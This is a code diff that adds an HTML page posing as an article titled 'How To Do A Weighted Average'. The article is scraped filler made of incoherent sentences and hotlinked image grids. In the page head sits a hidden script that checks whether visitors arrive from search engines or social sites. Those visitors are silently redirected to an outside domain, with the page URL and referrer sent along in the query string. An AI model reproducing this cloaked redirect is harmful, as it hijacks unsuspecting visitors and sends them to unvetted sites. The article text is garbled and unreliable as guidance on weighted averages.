@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <script>
+        var ars = 'http://leahrosenberg.org';
+
+        if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+    </script>
+
+    <meta charset="utf-8">
+    <meta name="description" content="My description">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <script type="application/ld+json">
+{
+  "@context": "https://schema.org/", 
+  "@type": "Article", 
+  "author": {
+    "@type": "Person",
+    "name": "Allen Pittman"
+  },
+  "headline": "How To Do A Weighted Average",
+  "datePublished": "2021-09-05",
+  "image": ["http://myexceltemplates.com/wp-content/uploads/2016/08/Weighted-Average.png",
+  "https://chrismenardtraining.com/_CMT/images/blogs/posts/featured/50.jpg",
+  "https://i.ytimg.com/vi/nieKCOSxJq8/maxresdefault.jpg"
+  ],
+  "publisher": {
+    "@type": "Organization",
+    "name": "Allen Pittman",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://via.placeholder.com/512.png?text=A",
+      "width": 512,
+      "height": 512
+    }
+  }
+}
+</script>
+    
+
+    <title>How To Do A Weighted Average</title>
+    <style>:root{--border-radius:5px;--box-shadow:2px 2px 10px;--color:#118bee;--color-accent:#118bee15;--color-bg:#fff;--color-bg-secondary:#e9e9e9;--color-secondary:#0645AD;--color-secondary-accent:#920de90b;--color-shadow:#f4f4f4;--color-text:#000;--color-text-secondary:#999;--font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;--hover-brightness:1.2;--justify-important:center;--justify-normal:left;--line-height:1.5;--width-card:285px;--width-card-medium:460px;--width-card-wide:800px;--width-content:1080px}article aside{background:var(--color-secondary-accent);border-left:4px solid var(--color-secondary);padding:.01rem .8rem}body{background:var(--color-bg);color:var(--color-text);font-family:var(--font-family);line-height:var(--line-height);margin:0;overflow-x:hidden;padding:1rem 0}footer,header,main{margin:0 auto;max-width:var(--width-content);padding:0rem 1rem}hr{background-color:var(--color-bg-secondary);border:none;height:1px;margin:4rem 0}section{display:flex;flex-wrap:wrap;justify-content:var(--justify-important)}section aside{border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);box-shadow:var(--box-shadow) var(--color-shadow);margin:1rem;padding:1.25rem;width:var(--width-card)}section aside:hover{box-shadow:var(--box-shadow) var(--color-bg-secondary)}section aside img{max-width:100%}[hidden]{display:none}article header,div header,main header{padding-top:0}header{text-align:var(--justify-important)}header a b,header a em,header a i,header a strong{margin-left:.5rem;margin-right:.5rem}header nav img{margin:1rem 0}section header{padding-top:0;width:100%}nav{align-items:center;display:flex;font-weight:700;justify-content:space-between;margin-bottom:7rem}nav ul{list-style:none;padding:0}nav ul li{display:inline-block;margin:0 .5rem;position:relative;text-align:left}nav ul li:hover ul{display:block}nav ul li ul{background:var(--color-bg);border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);box-shadow:var(--box-shadow) var(--color-shadow);display:none;height:auto;left:-2px;padding:.5rem 1rem;position:absolute;top:1.7rem;white-space:nowrap;width:auto}nav ul li ul li,nav ul li ul li a{display:block}code,samp{background-color:var(--color-accent);border-radius:var(--border-radius);color:var(--color-text);display:inline-block;margin:0 .1rem;padding:0 .5rem}details{margin:1.3rem 0}details summary{font-weight:700;cursor:pointer}h1,h2,h3,h4,h5,h6{line-height:var(--line-height)}mark{padding:.1rem}ol li,ul li{padding:.2rem 0}p{margin:.75rem 0;padding:0}pre{margin:1rem 0;max-width:var(--width-card-wide);padding:1rem 0}pre code,pre samp{display:block;max-width:var(--width-card-wide);padding:.5rem 2rem;white-space:pre-wrap}small{color:var(--color-text-secondary)}sup{background-color:var(--color-secondary);border-radius:var(--border-radius);color:var(--color-bg);font-size:xx-small;font-weight:700;margin:.2rem;padding:.2rem .3rem;position:relative;top:-2px}a{color:var(--color-secondary);display:inline-block;text-decoration:none}a:hover{filter:brightness(var(--hover-brightness));text-decoration:underline}a b,a em,a i,a strong,button{border-radius:var(--border-radius);display:inline-block;font-size:medium;font-weight:700;line-height:var(--line-height);margin:.5rem 0;padding:1rem 2rem}button{font-family:var(--font-family)}button:hover{cursor:pointer;filter:brightness(var(--hover-brightness))}a b,a strong,button{background-color:var(--color);border:2px solid var(--color);color:var(--color-bg)}a em,a i{border:2px solid var(--color);border-radius:var(--border-radius);color:var(--color);display:inline-block;padding:1rem 2rem}figure{margin:0;padding:0}figure img{max-width:100%}figure figcaption{color:var(--color-text-secondary)}button:disabled,input:disabled{background:var(--color-bg-secondary);border-color:var(--color-bg-secondary);color:var(--color-text-secondary);cursor:not-allowed}button[disabled]:hover{filter:none}form{border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);box-shadow:var(--box-shadow) var(--color-shadow);display:block;max-width:var(--width-card-wide);min-width:var(--width-card);padding:1.5rem;text-align:var(--justify-normal)}form header{margin:1.5rem 0;padding:1.5rem 0}input,label,select,textarea{display:block;font-size:inherit;max-width:var(--width-card-wide)}input[type=checkbox],input[type=radio]{display:inline-block}input[type=checkbox]+label,input[type=radio]+label{display:inline-block;font-weight:400;position:relative;top:1px}input,select,textarea{border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);margin-bottom:1rem;padding:.4rem .8rem}input[readonly],textarea[readonly]{background-color:var(--color-bg-secondary)}label{font-weight:700;margin-bottom:.2rem}table{border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);border-spacing:0;display:inline-block;max-width:100%;overflow-x:auto;padding:0;white-space:nowrap}table td,table th,table tr{padding:.4rem .8rem;text-align:var(--justify-important)}table thead{background-color:var(--color);border-collapse:collapse;border-radius:var(--border-radius);color:var(--color-bg);margin:0;padding:0}table thead th:first-child{border-top-left-radius:var(--border-radius)}table thead th:last-child{border-top-right-radius:var(--border-radius)}table thead th:first-child,table tr td:first-child{text-align:var(--justify-normal)}table tr:nth-child(even){background-color:var(--color-accent)}blockquote{display:block;font-size:x-large;line-height:var(--line-height);margin:1rem auto;max-width:var(--width-card-medium);padding:1.5rem 1rem;text-align:var(--justify-important)}blockquote footer{color:var(--color-text-secondary);display:block;font-size:small;line-height:var(--line-height);padding:1.5rem 0}</style>
+</head>
+<body>
+    <header>
+        <h1><a href="index.html">How To Do A Weighted Average</a></h1>
+        <p>Full and part time jobs with good salary</p>
+    </header>
+    <main>
+        
+<p><strong>How To Do A Weighted Average</strong>. Variance has to do with how precise your data is. Weights cannot be negative, though they can be zero.</p>
+<!--ads/auto.txt-->
+<p>
+	
+	
+	<figure>
+		<img src="https://chrismenardtraining.com/_CMT/images/posts/2017-03/weighted_average_1[1].jpg" alt="How to calculate the weighted average in Excel: Chris ..." style="width: 100%; padding: 5px; background-color: grey;">
+		<figcaption>How to calculate the weighted average in Excel: Chris ... (Bettie Fleming)</figcaption>
+	</figure>
+	
+	The weights do not have any. The weighted average is helpful to make a decision when there are many factors to consider and evaluate. Weighted average cost is a common inventory valuation method used by ecommerce businesses.
+</p>
+
+<h3>The higher the WAM, the longer How Does Weighted Average Maturity Work?</h3>
+<p>Originally Answered: How do you calculate your grade&#39;s weighted total as a percentage?</p>
+
+
+
+
+	<div style="display: grid;grid-template-columns: auto auto auto; background: #eee; ">
+	    
+		    <div style="padding: 1em;">
+		        <a href="http://trumpexcel.com/wp-content/uploads/2016/03/Calculate-Weighted-Average-in-Excel-Sumproduct-explaination.png"><img src="http://trumpexcel.com/wp-content/uploads/2016/03/Calculate-Weighted-Average-in-Excel-Sumproduct-explaination.png" onerror="this.onerror=null;this.src='https://tse3.mm.bing.net/th?id=OIP._o6wzKvGRVebyjK5pzxIdAHaEq&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>Calculating Weighted Average in Excel (Using Formulas)</p>
+		    </div>
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://cdn.extendoffice.com/images/stories/doc-excel/weighted-average/doc-weighted-average-2.png"><img src="https://cdn.extendoffice.com/images/stories/doc-excel/weighted-average/doc-weighted-average-2.png" onerror="this.onerror=null;this.src='https://tse4.mm.bing.net/th?id=OIP.wkafhR3fqm2n3ILebYcNTwHaE-&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>How to calculate weighted average in Excel?</p>
+		    </div>
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://www.howtogeek.com/wp-content/uploads/2019/01/xexcel-weighted-average-14.png.pagespeed.gp+jp+jw+pj+ws+js+rj+rp+rw+ri+cp+md.ic.4PDb99HIyG.png"><img src="https://www.howtogeek.com/wp-content/uploads/2019/01/xexcel-weighted-average-14.png.pagespeed.gp+jp+jw+pj+ws+js+rj+rp+rw+ri+cp+md.ic.4PDb99HIyG.png" onerror="this.onerror=null;this.src='https://tse3.mm.bing.net/th?id=OIP.owZPBqgcsdJwR0e457A-vQHaEY&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>How to Calculate a Weighted Average in Excel</p>
+		    </div>
+	    
+	</div>
+
+	<div style="display: grid;grid-template-columns: auto auto auto; background: #eee; ">
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://www.lifewire.com/thmb/RbnkSmG7hn2u7pq4Wm1ZtzCmv5c=/2098x1429/filters:fill(auto,1)/GettyImages-918718890-5bd20fee46e0fb00519b8218.jpg"><img src="https://www.lifewire.com/thmb/RbnkSmG7hn2u7pq4Wm1ZtzCmv5c=/2098x1429/filters:fill(auto,1)/GettyImages-918718890-5bd20fee46e0fb00519b8218.jpg" onerror="this.onerror=null;this.src='https://tse1.mm.bing.net/th?id=OIP.vdAM-Z3GV95fgKRyIKZJsQHaFC&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>How to Calculate Weighted Averages in Excel With SUMPRODUCT</p>
+		    </div>
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://www.basic-mathematics.com/images/weighted-mean-formula.png"><img src="https://www.basic-mathematics.com/images/weighted-mean-formula.png" onerror="this.onerror=null;this.src='https://tse2.mm.bing.net/th?id=OIP.0-EcU50NxYdJDWHLySdGBwAAAA&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>Calculate the Weighted Mean or the Weighted Average</p>
+		    </div>
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://exceljet.net/sites/default/files/images/lesson/screens/How%20to%20calculate%20an%20average%20value_SS.png"><img src="https://exceljet.net/sites/default/files/images/lesson/screens/How%20to%20calculate%20an%20average%20value_SS.png" onerror="this.onerror=null;this.src='https://tse3.mm.bing.net/th?id=OIP.-4hMUZ-i-ya5_Nb7zTMX4AHaEK&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>Download Calculate Weighted Average Excel | Gantt Chart ...</p>
+		    </div>
+	    
+	</div>
+
+	<div style="display: grid;grid-template-columns: auto auto auto; background: #eee; ">
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://s3.amazonaws.com/magoosh-company-site/wp-content/uploads/sites/27/2018/01/13182815/Weighted-Average.png"><img src="https://s3.amazonaws.com/magoosh-company-site/wp-content/uploads/sites/27/2018/01/13182815/Weighted-Average.png" onerror="this.onerror=null;this.src='https://tse1.mm.bing.net/th?id=OIP.R8Z51dmzxrlg3tQWgb0pdgHaEq&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>Weighted Average: How to Find It and When to Use It ...</p>
+		    </div>
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://cdn.educba.com/academy/wp-content/uploads/2019/04/Weighted-Mean-Formula-768x395.jpg"><img src="https://cdn.educba.com/academy/wp-content/uploads/2019/04/Weighted-Mean-Formula-768x395.jpg" onerror="this.onerror=null;this.src='https://tse1.mm.bing.net/th?id=OIP.Iov9eKLhMuC_iDnj654-XQHaDz&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>Weighted Mean Formula | Calculator (Excel Template)</p>
+		    </div>
+	    
+		    <div style="padding: 1em;">
+		        <a href="http://www.planprojections.com/wp-content/uploads/weighted-average-price-calculator.jpg"><img src="http://www.planprojections.com/wp-content/uploads/weighted-average-price-calculator.jpg" onerror="this.onerror=null;this.src='https://tse1.mm.bing.net/th?id=OIP.0SpvM4xrjn8IZNd8x_YjdwHaGT&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>Weighted Average Price | Plan Projections</p>
+		    </div>
+	    
+	</div>
+
+<p>Once you have your numbers, you&#39;ll need to know how much each of them weighs, or is worth, as part of your final. Do you use Weighted Mean / Weighted Average? For cells adjacent to each other I use sumproduct but can&#39;t find info on how to do it if the cells I need a weighted avg for.</p>
+    </main>
+    <footer style="padding-top: 50px;">
+        <center>
+            
+                <a href="index.html">Index</a>
+                
+                    |
+                
+            
+                <a href="contact.html">Contact</a>
+                
+                    |
+                
+            
+                <a href="copyright.html">Copyright</a>
+                
+                    |
+                
+            
+                <a href="dmca.html">DMCA</a>
+                
+                    |
+                
+            
+                <a href="privacy-policy.html">Privacy-Policy</a>
+                
+            
+        </center>
+    </footer>
+</body>
+
+</html>
